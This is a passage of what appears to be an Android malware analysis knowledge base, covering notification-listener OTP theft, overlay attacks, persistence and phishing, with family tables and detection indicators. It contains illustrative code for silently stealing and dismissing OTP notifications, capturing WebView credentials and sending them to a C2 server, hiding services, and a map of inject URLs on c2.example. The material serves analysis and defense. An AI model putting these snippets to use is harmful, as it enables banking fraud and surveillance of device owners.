evasion: check whether relay introduces detectable timing anomalies that issuer-side fraud systems could flag</li> </ul>"},{"location":"attacks/notification-listener-abuse/","title":"Notification Listener Abuse","text":"<p>Exploiting <code>NotificationListenerService</code> to silently read, exfiltrate, and dismiss notifications from every app on the device. As Android progressively restricted SMS permissions and Google Play banned their use in most apps, malware pivoted to notification listeners as the primary channel for OTP theft, message surveillance, and evidence suppression.</p>"},{"location":"attacks/notification-listener-abuse/#requirements","title":"Requirements","text":"Requirement Details Permission <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Grant Method User must manually enable in Settings &gt; Apps &gt; Special access &gt; Notification access Introduced API 18 (Android 4.3)"},{"location":"attacks/notification-listener-abuse/#why-malware-moved-to-notification-listeners","title":"Why Malware Moved to Notification Listeners","text":"<p>Google's January 2019 policy change restricted <code>READ_SMS</code> and <code>RECEIVE_SMS</code> to apps declared as the default SMS handler. Apps that could not justify the need were rejected from Play Store. This created a gap that notification listeners filled:</p> Factor SMS Interception Notification Listener Play Store policy Restricted since 2019 No policy restriction Runtime permission <code>RECEIVE_SMS</code> runtime prompt No runtime prompt -- Settings toggle Coverage SMS only SMS, WhatsApp, Telegram, email, authenticator apps, push notifications Real-time Yes Yes Can suppress delivery Yes (<code>abortBroadcast</code>, pre-4.4) Yes (<code>cancelNotification</code>) Works on Android 10+ Heavily restricted Fully functional"},{"location":"attacks/notification-listener-abuse/#how-it-works","title":"How It Works","text":""},{"location":"attacks/notification-listener-abuse/#service-declaration","title":"Service Declaration","text":"<p>The malware declares a <code>NotificationListenerService</code> in its manifest:</p> <pre><code>&lt;service\n    android:name=\".NLService\"\n    android:permission=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.service.notification.NotificationListenerService\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/service&gt;\n</code></pre> <p>Once the user enables notification access, the system binds to this service and delivers every notification event.</p>"},{"location":"attacks/notification-listener-abuse/#statusbarnotification-fields","title":"StatusBarNotification Fields","text":"<p>Each callback receives a <code>StatusBarNotification</code> object. The fields malware targets:</p> Field Access Path Data Source app <code>sbn.getPackageName()</code> Identifies which app posted the notification Title <code>notification.extras.getString(EXTRA_TITLE)</code> Sender name, app name, or subject line Text <code>notification.extras.getString(EXTRA_TEXT)</code> Message body, OTP code, transaction details Big text <code>notification.extras.getString(EXTRA_BIG_TEXT)</code> Expanded notification content with full message Subtext <code>notification.extras.getString(EXTRA_SUB_TEXT)</code> Account identifiers, secondary info Post time <code>sbn.getPostTime()</code> When the notification was posted Key <code>sbn.getKey()</code> Used to dismiss specific notifications"},{"location":"attacks/notification-listener-abuse/#otp-extraction","title":"OTP Extraction","text":"<p>The core malware use case. Banking apps, email providers, and SMS all surface OTP codes in notification text. The extraction flow:</p> <pre><code>public class NLService extends NotificationListenerService {\n    @Override\n    public void onNotificationPosted(StatusBarNotification sbn) {\n        Bundle extras = sbn.getNotification().extras;\n        String text = extras.getString(Notification.EXTRA_TEXT);\n        String bigText = extras.getString(Notification.EXTRA_BIG_TEXT);\n        String content = bigText != null ? bigText : text;\n\n        if (content == null) return;\n\n        String otp = extractOtp(content);\n        if (otp != null) {\n            exfiltrateToC2(sbn.getPackageName(), otp);\n            cancelNotification(sbn.getKey());\n        }\n    }\n\n    private String extractOtp(String text) {\n        Matcher m = Pattern.compile(\"\\\\b(\\\\d{4,8})\\\\b\").matcher(text);\n        if (m.find()) return m.group(1);\n        return null;\n    }\n}\n</code></pre> <p>Malware typically filters by package name to target specific banking or authentication apps, then uses regex to pull numeric codes from the notification body. After extraction, the notification is dismissed so the user never sees it.</p>"},{"location":"attacks/notification-listener-abuse/#message-surveillance","title":"Message Surveillance","text":"<p>Messaging app notifications expose sender and preview text. WhatsApp, Telegram, Signal, and SMS all display message previews in the notification shade. The listener captures:</p> <ul> <li>WhatsApp: sender name in <code>EXTRA_TITLE</code>, message content in <code>EXTRA_TEXT</code></li> <li>Telegram: channel/contact name in title, message preview in text</li> <li>SMS/MMS: phone number or contact name in title, message body in text</li> <li>Email: subject in title, preview text in body</li> </ul> <p>For group chats, <code>EXTRA_TEXT</code> typically contains \"Sender: message\" format, giving the listener both the sender identity and content.</p>"},{"location":"attacks/notification-listener-abuse/#notification-dismissal","title":"Notification Dismissal","text":"<p><code>cancelNotification(key)</code> removes a notification from the shade. Malware uses this to:</p> <ul> <li>Hide OTP notifications after extracting the code, preventing the user from noticing the 2FA attempt</li> <li>Suppress banking transaction alerts that would reveal unauthorized transfers</li> <li>Dismiss antivirus detection notifications</li> <li>Remove Google Play Protect warnings</li> </ul> <p>The user sees nothing -- the notification appears and vanishes within milliseconds.</p>"},{"location":"attacks/notification-listener-abuse/#auto-enabling-via-accessibility","title":"Auto-Enabling via Accessibility","text":"<p>The notification listener requires manual user enablement in Settings. Malware with an active accessibility service automates this:</p> <ol> <li>Open <code>Settings</code> via intent: <code>android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS</code></li> <li>Use accessibility to find the malware's entry in the list</li> <li>Tap the toggle to enable it</li> <li>Navigate back, dismiss any confirmation dialogs</li> </ol> <p>This requires no user interaction beyond the initial accessibility service grant. Several families chain the two: accessibility enables notification listener, and both work in tandem for full device surveillance.</p>"},{"location":"attacks/notification-listener-abuse/#otp-theft-method-comparison","title":"OTP Theft: Method Comparison","text":"Method Permission Coverage Suppress Android 10+ Play Store Stealth SMS broadcast receiver <code>RECEIVE_SMS</code> SMS only Pre-4.4 only Restricted Banned Low ContentResolver SMS query <code>READ_SMS</code> Stored SMS No Restricted Banned Low Notification listener <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> All notifying apps Yes Works Allowed High Accessibility screen reading <code>BIND_ACCESSIBILITY_SERVICE</code> Full screen content No Works Scrutinized High SmsRetriever API None App-specific SMS No Works Allowed Very high <p>Notification listeners hit the sweet spot: broad coverage, ability to suppress evidence, no runtime permission dialog, and less Play Store scrutiny than accessibility services.</p>"},{"location":"attacks/notification-listener-abuse/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.3 (API 18): <code>NotificationListenerService</code> introduced. Any enabled listener receives all notifications.</p> <p>Android 5.0 (API 21): <code>cancelNotification(key)</code> added, replacing the tag/id-based cancellation. Malware can now precisely dismiss individual notifications.</p> <p>Android 8.0 (API 26): notification channels introduced. Notifications include channel information, giving listeners more context for filtering.</p> <p>Android 11 (API 30): notification history API (<code>getNotificationHistory()</code>). A listener can retroactively access recent notifications even if it was not running when they were posted.</p> <p>Android 13 (API 33): restricted settings for sideloaded apps. Apps installed via sideloading cannot direct users to notification access settings. Malware bypasses this by distributing through stores recognized by the installer, or by using session-based installers that set the correct installer package name.</p> <p>Android 14 (API 34): further tightening of restricted settings. The <code>RECEIVER_EXPORTED</code> flag requirement affects broadcast-based notification workarounds.</p>"},{"location":"attacks/notification-listener-abuse/#families-using-this-technique","title":"Families Using This Technique","text":"Family Notification Abuse Primary Purpose Joker Reads confirmation notifications to complete premium subscriptions silently Subscription fraud Anatsa Extracts OTPs from banking notifications during automated transfers ATS-based bank fraud Cerberus Notification-based 2FA theft as fallback when SMS interception fails Banking credential theft GodFather Monitors push notifications for OTPs across 400+ banking targets Banking fraud Mamont Push notification interception as primary OTP mechanism, avoids SMS permissions entirely Russian banking fraud Fakecalls Hides call-related notifications to maintain the illusion of a legitimate bank call VoIP call spoofing Xenomorph Notification listener for OTP capture plus message exfiltration from messaging apps Banking ATS Hook WhatsApp message exfiltration via notification interception Surveillance, banking fraud Alien First major family to use notification sniffing as a primary 2FA bypass Banking credential theft Medusa v2 dropped SMS permissions, relies on notification listener for OTP theft Banking fraud ToxicPanda Notification interception for OTP codes during on-device fraud Banking ATS Sturnus Captures notifications from encrypted messaging apps Banking fraud FireScam Intercepts notifications across all apps for broad surveillance Spyware SpyNote Full notification monitoring as part of comprehensive device surveillance RAT <p>Joker deserves special mention: it reads incoming SMS confirmation codes from notifications to silently complete WAP billing subscriptions, never needing SMS permissions and never alerting the user.</p>"},{"location":"attacks/notification-listener-abuse/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li><code>NotificationListenerService</code> in manifest with <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> permission</li> <li>References to <code>Notification.EXTRA_TEXT</code>, <code>EXTRA_TITLE</code>, <code>EXTRA_BIG_TEXT</code></li> <li>Regex patterns targeting numeric OTP codes (4-8 digit sequences)</li> <li><code>cancelNotification()</code> or <code>cancelAllNotifications()</code> calls</li> <li>Intent action <code>ACTION_NOTIFICATION_LISTENER_SETTINGS</code> indicating automated enablement</li> </ul> <p>Dynamic indicators:</p> <ul> <li>App requesting notification access during installation flow</li> <li>Accessibility service navigating to notification listener settings</li> <li>Network traffic containing notification content or extracted OTP codes shortly after notification events</li> <li>Notifications disappearing from the shade faster than the user could read them</li> </ul>"},{"location":"attacks/overlay-attacks/","title":"Overlay Attacks","text":"<p>Drawing a fake UI on top of a legitimate app to steal credentials. The defining technique of Android banking malware since ~2016. The attacker creates a window that looks identical to a banking app's login screen, and the user types their credentials into the attacker's view.</p>"},{"location":"attacks/overlay-attacks/#requirements","title":"Requirements","text":"Requirement Details Permission <code>SYSTEM_ALERT_WINDOW</code> or <code>BIND_ACCESSIBILITY_SERVICE</code> Trigger Foreground app detection (knowing when to show the overlay) Payload HTML/WebView template matching the target app's UI"},{"location":"attacks/overlay-attacks/#how-it-works","title":"How It Works","text":""},{"location":"attacks/overlay-attacks/#foreground-detection","title":"Foreground Detection","text":"<p>The malware needs to know when the user opens a target app. Methods used:</p> Method Android Version Details <code>getRunningTasks()</code> Pre-5.0 Deprecated, returns only caller's tasks on 5.0+ <code>UsageStatsManager</code> 5.0+ Requires <code>PACKAGE_USAGE_STATS</code>, polls every ~1 second Accessibility events 4.1+ <code>TYPE_WINDOW_STATE_CHANGED</code> fires when any activity starts, most reliable <code>ActivityLifecycleCallbacks</code> Only for own process Not useful for monitoring other apps <p>Accessibility is the preferred method: it's real-time, requires no polling, and the malware likely needs accessibility for other purposes anyway.</p>"},{"location":"attacks/overlay-attacks/#injection-display","title":"Injection Display","text":"<p>When the target app is detected, the malware displays its overlay:</p> <p>WebView approach (most common): a <code>WebView</code> loads an HTML page styled to match the target app. These HTML templates (\"injects\" or \"webfakes\") are downloaded from C2 per target app. Major malware operations maintain inject kits covering hundreds of banking apps across multiple countries.</p> <p>Native View approach: Android <code>View</code> objects constructed programmatically. Less common because it's harder to maintain across app UI updates.</p> <p>Full Activity approach: some families launch a full <code>Activity</code> with <code>FLAG_ACTIVITY_NEW_TASK</code> themed to look like the target. This doesn't require <code>SYSTEM_ALERT_WINDOW</code> but is less precise in timing.</p>"},{"location":"attacks/overlay-attacks/#credential-capture","title":"Credential Capture","text":"<p>The injected form submits entered data to C2 via HTTPS POST. Captured fields typically include:</p> <ul> <li>Login credentials (username, password)</li> <li>Card numbers (PAN, CVV, expiry)</li> <li>PINs</li> <li>Security questions</li> </ul>"},{"location":"attacks/overlay-attacks/#inject-kits","title":"Inject Kits","text":"<p>Malware-as-a-service (MaaS) operations sell or rent inject kits. An inject kit is a collection of HTML/CSS/JS files, one per target app, that mimic the target's login UI. These are versioned and updated when banks change their UI.</p> <p>The C2 server maps package names to inject URLs:</p> <pre><code>com.chase.sig.android -&gt; https://c2.example/injects/chase.html\ncom.bankofamerica.cashpromobile -&gt; https://c2.example/injects/boa.html\n</code></pre> <p>The malware downloads only injects for apps found on the device (see <code>QUERY_ALL_PACKAGES</code>).</p>"},{"location":"attacks/overlay-attacks/#evolution","title":"Evolution","text":"Era Technique Example Families 2014-2016 Simple overlays using <code>TYPE_SYSTEM_ALERT</code> GM Bot, BankBot 2016-2018 WebView-based injects, C2-managed templates Marcher, Red Alert 2018-2020 Accessibility-triggered overlays, large inject kits Cerberus, Anubis, Hydra 2020-2022 ATS (Automated Transfer System), overlay + accessibility combo Anatsa, SharkBot, Xenomorph 2022-2024 Overlays declining as primary technique, replaced by full device control via accessibility Hook, Octo/ExobotCompact 2025 On-device virtualization: real banking apps run inside malware-controlled sandbox GodFather v3 2025 NFC payment overlays: fake tap-to-pay screens capturing card data Hook v3 <p>The trend is away from pure overlay attacks toward on-device fraud using accessibility to operate the real banking app directly. Overlays are still used for initial credential capture, but the real value is in accessibility-based ATS. The most recent evolution (GodFather v3) bypasses overlays entirely by running the real banking app inside a virtual environment and intercepting all interactions at runtime.</p>"},{"location":"attacks/overlay-attacks/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 8 <code>TYPE_APPLICATION_OVERLAY</code> renders below permission dialogs Attacker doesn't need to overlay permission dialogs Android 10 Overlays can't appear over focused app activities Accessibility gestures bypass this entirely Android 12 <code>FLAG_WINDOW_IS_PARTIALLY_OBSCURED</code> warns apps of overlays Most apps don't check this flag Android 12 Overlays untouchable over system dialogs Accessibility service performs the touches instead <p>Each mitigation pushed malware toward heavier reliance on accessibility services rather than eliminating the attack.</p>"},{"location":"attacks/overlay-attacks/#families-using-this-technique","title":"Families Using This Technique","text":"Family Overlay Approach Inject Kit Size Also Uses ATS Cerberus WebView 300+ targets No Anubis WebView 250+ targets No BankBot Activity 50+ targets No Hydra WebView 400+ targets No Hook WebView 400+ targets Yes GodFather WebView 400+ targets No Ermac WebView 400+ targets No Xenomorph WebView 400+ targets Yes Octo WebView 200+ targets Yes Alien WebView 200+ targets No Medusa WebView 100+ targets No SharkBot Native 20+ targets Yes Zanubis WebView 40+ targets Yes Fakecalls WebView Korean banks No Mamont WebView Russian banks No Copybara WebView Italian banks Yes Crocodilus WebView 8 countries Yes BingoMod WebView European banks Yes Brokewell WebView European banks Yes Klopatra WebView Turkish banks Yes Albiriox WebView 400+ targets Yes Herodotus WebView Southern/Central EU Yes GoldPickaxe WebView Thai/Vietnamese banks No Sturnus WebView Southern/Central EU Yes Antidot WebView Multi-language Yes TrickMo WebView European banks No TsarBot WebView 750+ targets Yes BlankBot WebView Turkish banks Yes Vultur Native European banks Yes Chameleon WebView AU/EU banks No ToxicPanda WebView EU/LATAM banks Yes Frogblight WebView Turkish banks Yes BTMOB RAT WebView injection (<code>brows</code> command) Crypto/banking Yes Rafel RAT Activity-based Multi-region No RatOn WebView Czech banks Yes DeVixor WebView Iranian banks No <p>Notable exceptions: Gigabud and Vultur v1 deliberately avoid overlay attacks, using screen recording instead to capture credentials as the victim interacts with their real banking app. NGate uses a phishing WebView for card PIN entry rather than traditional banking overlays.</p>"},{"location":"attacks/overlay-attacks/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li><code>SYSTEM_ALERT_WINDOW</code> in manifest</li> <li><code>TYPE_APPLICATION_OVERLAY</code> in code</li> <li><code>UsageStatsManager</code> calls for foreground detection</li> <li>WebView loading local HTML or C2-hosted URLs</li> <li>Accessibility service monitoring <code>TYPE_WINDOW_STATE_CHANGED</code></li> </ul> <p>Dynamic indicators:</p> <ul> <li>Window created with overlay type when a banking app is foregrounded</li> <li>Network request to C2 matching pattern of inject download</li> <li>HTML files stored in app's internal storage matching banking app names</li> </ul>"},{"location":"attacks/persistence-techniques/","title":"Persistence Techniques","text":"<p>Surviving device reboots, app kills, and user attempts at removal. Android's process lifecycle aggressively terminates background apps to conserve resources, so malware must actively fight to stay alive. The most resilient families layer multiple persistence mechanisms, ensuring that if one is killed, another restarts it.</p>"},{"location":"attacks/persistence-techniques/#requirements","title":"Requirements","text":"Requirement Details Boot persistence <code>RECEIVE_BOOT_COMPLETED</code> (normal permission, auto-granted) Background execution <code>FOREGROUND_SERVICE</code> (normal permission, auto-granted) Battery exemption <code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> Anti-uninstall <code>BIND_DEVICE_ADMIN</code> (requires user activation) Self-restart <code>BIND_ACCESSIBILITY_SERVICE</code> (system manages lifecycle)"},{"location":"attacks/persistence-techniques/#boot-receiver","title":"Boot Receiver","text":"<p>The simplest and most common persistence method. Registering a <code>BroadcastReceiver</code> for <code>BOOT_COMPLETED</code> causes Android to start the malware's component every time the device boots.</p> <pre><code>&lt;receiver android:name=\".BootReceiver\"\n    android:enabled=\"true\"\n    android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.BOOT_COMPLETED\" /&gt;\n        &lt;action android:name=\"android.intent.action.QUICKBOOT_POWERON\" /&gt;\n        &lt;action android:name=\"com.htc.intent.action.QUICKBOOT_POWERON\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <pre><code>public class BootReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        Intent serviceIntent = new Intent(context, MalwareService.class);\n        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) {\n            context.startForegroundService(serviceIntent);\n        } else {\n            context.startService(serviceIntent);\n        }\n    }\n}\n</code></pre> <p>Multiple boot actions are registered because some OEMs (HTC, Xiaomi) fire vendor-specific boot broadcasts in addition to or instead of the standard one.</p>"},{"location":"attacks/persistence-techniques/#foreground-service","title":"Foreground Service","text":"<p>Android 8+ kills background services within minutes. The standard workaround is a foreground service, which requires a visible notification but is protected from the system's background execution limits.</p> <pre><code>public class PersistentService extends Service {\n    @Override\n    public int onStartCommand(Intent intent, int flags, int startId) {\n        NotificationChannel channel = new NotificationChannel(\n            \"stealth\", \" \", NotificationManager.IMPORTANCE_MIN);\n        channel.setShowBadge(false);\n        getSystemService(NotificationManager.class).createNotificationChannel(channel);\n\n        Notification notification = new Notification.Builder(this, \"stealth\")\n            .setSmallIcon(android.R.drawable.ic_dialog_info)\n            .setContentTitle(\" \")\n            .build();\n        startForeground(1, notification);\n        return START_STICKY;\n    }\n\n    @Override\n    public IBinder onBind(Intent intent) {\n        return null;\n    }\n}\n</code></pre> <p>The notification channel uses <code>IMPORTANCE_MIN</code> and a blank name to make the notification as invisible as possible. <code>START_STICKY</code> tells Android to restart the service if the system kills it. SpyNote and Anubis both rely on this pattern.</p>"},{"location":"attacks/persistence-techniques/#scheduled-execution","title":"Scheduled Execution","text":""},{"location":"attacks/persistence-techniques/#jobscheduler","title":"JobScheduler","text":"<p>Schedules work that survives process death. The system manages when the job runs based on constraints (network, charging, idle).</p> <pre><code>ComponentName serviceName = new ComponentName(context, MalwareJobService.class);\nJobInfo jobInfo = new JobInfo.Builder(1337, serviceName)\n    .setPersisted(true)\n    .setPeriodic(15 * 60 * 1000)\n    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)\n    .build();\n\nJobScheduler scheduler = context.getSystemService(JobScheduler.class);\nscheduler.schedule(jobInfo);\n</code></pre> <p><code>setPersisted(true)</code> makes the job survive reboots (requires <code>RECEIVE_BOOT_COMPLETED</code>). The minimum periodic interval is 15 minutes on Android 7+.</p>"},{"location":"attacks/persistence-techniques/#alarmmanager","title":"AlarmManager","text":"<p>For more precise timing. <code>setExactAndAllowWhileIdle()</code> fires even during Doze mode, though Android 12+ restricts exact alarms and requires <code>SCHEDULE_EXACT_ALARM</code> or <code>USE_EXACT_ALARM</code>.</p> <pre><code>AlarmManager alarmManager = context.getSystemService(AlarmManager.class);\nIntent intent = new Intent(context, WakeUpReceiver.class);\nPendingIntent pending = PendingIntent.getBroadcast(\n    context, 0, intent, PendingIntent.FLAG_IMMUTABLE);\nalarmManager.setExactAndAllowWhileIdle(\n    AlarmManager.ELAPSED_REALTIME_WAKEUP,\n    SystemClock.elapsedRealtime() + 60_000,\n    pending);\n</code></pre>"},{"location":"attacks/persistence-techniques/#accountmanager-sync-adapter","title":"AccountManager Sync Adapter","text":"<p>An underused but effective persistence method. The malware registers as a sync adapter for a custom account type. Android's sync framework periodically triggers the adapter, providing reliable execution without visible notifications.</p> <p>The sync adapter runs in its own process and benefits from the system's built-in retry and scheduling logic. Mandrake used this technique to maintain periodic C2 communication.</p>"},{"location":"attacks/persistence-techniques/#accessibility-service-persistence","title":"Accessibility Service Persistence","text":"<p>An active accessibility service is managed by the system and automatically restarted if it crashes. As long as the user doesn't manually revoke the toggle in Settings, the service persists indefinitely across reboots.</p> <p>This makes accessibility the most reliable persistence mechanism available without root. The malware can also use accessibility to prevent its own removal -- detecting when the user navigates to Settings &gt; Apps and pressing \"Back\" or \"Home\" before they can reach the uninstall button.</p>"},{"location":"attacks/persistence-techniques/#anti-uninstall-techniques","title":"Anti-Uninstall Techniques","text":""},{"location":"attacks/persistence-techniques/#device-admin","title":"Device Admin","text":"<p>Activating as a device administrator prevents uninstallation. The user must deactivate the admin first, but the malware can use accessibility to block navigation to the deactivation screen.</p> <p>Cerberus combined device admin with accessibility: any attempt to open device admin settings triggers the accessibility service to press Home, making deactivation nearly impossible without ADB or safe mode.</p>"},{"location":"attacks/persistence-techniques/#hiding-from-launcher","title":"Hiding from Launcher","text":"<p>Removing the launcher <code>Activity</code> from the manifest (or disabling the component at runtime) hides the app from the app drawer. The user can still find it in Settings &gt; Apps, but most users won't think to look there.</p> <pre><code>PackageManager pm = getPackageManager();\npm.setComponentEnabledSetting(\n    new ComponentName(this, LauncherActivity.class),\n    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,\n    PackageManager.DONT_KILL_APP);\n</code></pre> <p>Joker, FluBot, and many RATs use this immediately after initial execution.</p>"},{"location":"attacks/persistence-techniques/#firmware-level-persistence","title":"Firmware-Level Persistence","text":""},{"location":"attacks/persistence-techniques/#pre-installed-malware","title":"Pre-installed Malware","text":"<p>Triada achieved persistence by infecting the device firmware during manufacturing. The malware was embedded in the system partition (read-only at runtime), surviving factory resets and any user-level remediation. Only reflashing the firmware with a clean image removes it.</p> <p>This represents the most resilient form of persistence on Android. Discovered in budget devices where supply chain compromise occurred at the factory or during distribution.</p>"},{"location":"attacks/persistence-techniques/#root-based-system-installation","title":"Root-Based System Installation","text":"<p>Pegasus and other state-sponsored malware use exploit chains to gain root, then install themselves as a system app in <code>/system/app/</code> or <code>/system/priv-app/</code>. System apps persist across factory resets and receive elevated privileges. Short of reflashing the firmware, the malware is permanent.</p>"},{"location":"attacks/persistence-techniques/#battery-optimization-exemption","title":"Battery Optimization Exemption","text":"<p>Android's Doze mode and App Standby buckets restrict background execution. Malware requests exemption:</p> <pre><code>Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);\nintent.setData(Uri.parse(\"package:\" + getPackageName()));\nstartActivity(intent);\n</code></pre> <p>This shows a system dialog. Some families use accessibility to auto-tap \"Allow\" on this dialog. Others disguise the request behind a fake loading screen so the user doesn't realize what they're approving.</p>"},{"location":"attacks/persistence-techniques/#oem-specific-persistence","title":"OEM-Specific Persistence","text":"<p>Chinese OEMs (Xiaomi, Huawei, Oppo, Vivo) maintain their own autostart managers that independently restrict background apps. Even with <code>RECEIVE_BOOT_COMPLETED</code> and battery optimization disabled, these OEMs may kill the app unless it is whitelisted in their proprietary autostart list.</p> <p>Malware targeting these regions often includes OEM-specific code that detects the manufacturer and launches the appropriate settings intent to guide (or force via accessibility) the user into whitelisting the app.</p>"},{"location":"attacks/persistence-techniques/#android-version-restrictions","title":"Android Version Restrictions","text":"Restriction Version Impact Malware Workaround Background service limits Android 8+ Services killed within minutes Foreground service with notification Background location limits Android 10+ Location only while app is visible Foreground service with <code>location</code> type Foreground service launch restrictions Android 12+ Cannot start foreground service from background Boot receiver, alarm, or accessibility event as trigger Exact alarm restrictions Android 12+ <code>SCHEDULE_EXACT_ALARM</code> required Use <code>setAndAllowWhileIdle()</code> (inexact) or request permission Notification permission Android 13+ <code>POST_NOTIFICATIONS</code> required (runtime permission) Social engineer the grant, or use silent notification channels created pre-upgrade Background activity launch restrictions Android 10+ Cannot start activities from background <code>USE_FULL_SCREEN_INTENT</code> or accessibility <code>performGlobalAction</code> Foreground service type requirements Android 14+ Must declare foreground service type in manifest Declare appropriate type or use alternative persistence <p>Each restriction pushed malware toward more creative solutions. The overall trend is layering multiple persistence methods so that at least one survives the increasingly aggressive background restrictions.</p>"},{"location":"attacks/persistence-techniques/#persistence-method-comparison","title":"Persistence Method Comparison","text":"Method Survives Reboot Survives Force Stop Stealth Reliability Min Android Boot receiver Yes No High High All Foreground service No No Low (notification) High 8+ JobScheduler Yes (persisted) No High Medium 5+ AlarmManager No No High Medium All Sync adapter Yes No High Medium All Accessibility service Yes Yes (if enabled) Medium Very high 4.1+ Device admin N/A (anti-uninstall) N/A Low High All System app / firmware Yes Yes Very high Permanent All"},{"location":"attacks/persistence-techniques/#families-by-persistence-strategy","title":"Families by Persistence Strategy","text":"Family Primary Persistence Secondary Anti-Uninstall Triada Firmware System app Factory reset resistant Pegasus Root + system install Multiple Survives factory reset SpyNote Foreground service Boot receiver Hides from launcher Anubis Boot receiver Foreground service Device admin Cerberus Accessibility Boot receiver Device admin + accessibility block Joker JobScheduler Boot receiver Hides from launcher Hook Foreground service Boot receiver + accessibility Device admin FluBot Boot receiver Foreground service Hides from launcher, accessibility block Mandrake Sync adapter Boot receiver Hides from launcher GodFather Accessibility Foreground service Accessibility block"},{"location":"attacks/persistence-techniques/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li><code>RECEIVE_BOOT_COMPLETED</code> in manifest with a <code>BroadcastReceiver</code></li> <li><code>FOREGROUND_SERVICE</code> with <code>IMPORTANCE_MIN</code> or <code>IMPORTANCE_NONE</code> notification channels</li> <li><code>DeviceAdminReceiver</code> declared in manifest</li> <li><code>SyncAdapter</code> and <code>AccountAuthenticator</code> XML metadata</li> <li><code>setComponentEnabledSetting()</code> calls targeting launcher activity</li> <li><code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> in manifest</li> </ul> <p>Dynamic indicators:</p> <ul> <li>Service immediately started after boot broadcast received</li> <li>Notification channel created with empty name or minimal importance</li> <li>Device admin activation prompt shown shortly after install</li> <li>Navigation to autostart manager or battery optimization settings via intent</li> <li>Accessibility service preventing navigation to app management screens</li> </ul>"},{"location":"attacks/phishing-techniques/","title":"Phishing &amp; Social Engineering","text":"<p>Tricking Android users into installing malware, surrendering credentials, or granting dangerous permissions. Unlike technical exploits that target software flaws, phishing targets human trust. On Android, the attack surface is broader than on desktop: SMS messages, push notifications, phone calls, QR codes, and sideloaded APKs all serve as delivery mechanisms.</p>"},{"location":"attacks/phishing-techniques/#delivery-vectors","title":"Delivery Vectors","text":"Vector Description Reach Example Families Smishing (SMS) Bulk SMS with malicious links, often spoofing sender ID Mass FluBot, Mamont, MoqHao Play Store dropper Benign app passes review, downloads malicious payload post-install High trust Anatsa, Joker, Harly Fake APK sites Cloned Play Store pages or standalone download sites hosting trojanized APKs Targeted GodFather, SpyNote QR code phishing Physical or digital QR codes leading to malicious download or credential page In-person Anatsa variants Malvertising Ad networks serving redirects to phishing or APK download pages Mass Vultur, Brokewell Messaging apps Malicious links spread through WhatsApp, Telegram, or other messengers Social graph FluBot, GriftHorse"},{"location":"attacks/phishing-techniques/#smishing-in-detail","title":"Smishing in Detail","text":"<p>SMS phishing remains the dominant initial access vector. The attacker sends a text containing a shortened URL or a domain visually similar to a trusted brand. On Android, the SMS app renders URLs as tappable links with no reputation check by default.</p> <p>FluBot weaponized this into a self-propagating worm: after infecting a device, it read the victim's contact list via <code>READ_CONTACTS</code> and <code>SEND_SMS</code>, then sent smishing messages to every contact. At its peak in 2021, FluBot generated millions of SMS messages per day across Europe.</p>"},{"location":"attacks/phishing-techniques/#play-store-droppers","title":"Play Store Droppers","text":"<p>The dropper pattern: a clean app (typically a PDF reader, QR scanner, or file manager) passes Google Play Protect review. After installation, it either downloads a second-stage APK from C2 or uses <code>DexClassLoader</code> to load a malicious DEX payload. Anatsa used this extensively throughout 2023-2024, with individual dropper apps reaching 100,000+ installs before removal.</p>"},{"location":"attacks/phishing-techniques/#credential-capture-techniques","title":"Credential Capture Techniques","text":""},{"location":"attacks/phishing-techniques/#webview-based-fake-login-pages","title":"WebView-Based Fake Login Pages","text":"<p>The malware loads an attacker-controlled HTML page inside a <code>WebView</code>. The page mimics a banking app's login screen. Credentials entered into the form are captured via JavaScript interface or intercepted via <code>shouldOverrideUrlLoading()</code>.</p> <pre><code>webView.setWebViewClient(new WebViewClient() {\n    @Override\n    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {\n        String url = request.getUrl().toString();\n        if (url.contains(\"login_submit\")) {\n            Uri uri = request.getUrl();\n            String user = uri.getQueryParameter(\"username\");\n            String pass = uri.getQueryParameter(\"password\");\n            exfilToC2(user, pass);\n            return true;\n        }\n        return false;\n    }\n});\n</code></pre>"},{"location":"attacks/phishing-techniques/#overlay-based-credential-capture","title":"Overlay-Based Credential Capture","text":"<p>A fake UI drawn on top of the real banking app. Triggered when the target app reaches the foreground. Covered in depth in Overlay Attacks.</p>"},{"location":"attacks/phishing-techniques/#progressive-web-app-pwa-phishing","title":"Progressive Web App (PWA) Phishing","text":"<p>A newer technique: the phishing page prompts the victim to \"install\" a Progressive Web App. The PWA is added to the home screen with a convincing icon and name (e.g., the victim's bank). When opened, it displays a full-screen credential harvesting form. PWAs bypass sideloading warnings entirely since they install through the browser. This technique was observed targeting Czech and Hungarian banking customers in 2024.</p>"},{"location":"attacks/phishing-techniques/#voice-based-attacks","title":"Voice-Based Attacks","text":""},{"location":"attacks/phishing-techniques/#fake-call-interception","title":"Fake Call Interception","text":"<p>Fakecalls intercepts outgoing calls to real bank phone numbers. When the victim dials their bank, Fakecalls cancels the real call and plays a pre-recorded IVR (Interactive Voice Response) that sounds identical to the bank's phone system. The fake IVR prompts the victim to enter card details via the keypad, which the malware captures.</p> <p>This requires <code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code>, and the ability to detect outgoing calls. Targets Korean financial 